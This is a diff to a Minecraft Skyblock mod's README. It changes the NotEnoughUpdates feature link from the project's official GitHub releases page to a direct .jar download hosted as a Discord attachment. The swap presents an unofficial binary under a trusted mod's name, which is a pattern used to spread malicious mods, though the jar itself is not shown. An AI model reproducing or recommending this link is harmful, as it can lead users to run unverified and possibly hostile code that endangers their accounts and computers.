@@ -6,7 +6,7 @@ the game.
 
 ## Features
 
-* Custom Enchant Menu - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Custom Enchant Menu - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Show Anvil Uses - Useless on Skyblock now
 * Show Item Tier - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Cancel Item Damage - ?
